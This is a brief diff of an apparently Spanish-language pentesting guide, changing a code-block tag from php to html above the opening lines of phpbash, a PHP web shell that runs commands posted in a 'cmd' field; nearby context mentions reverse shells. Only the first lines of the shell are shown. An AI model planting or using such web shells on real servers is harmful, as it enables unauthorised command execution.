@@ -199,7 +199,7 @@ function printit ($string) {
 
 También existe una versión web interactiva sin necesidad de generar una reverse shell.
 
-```php
+```html
 <?php
 /* phpbash by Alexander Reid (Arrexel) */
 if (ISSET($_POST['cmd'])) {
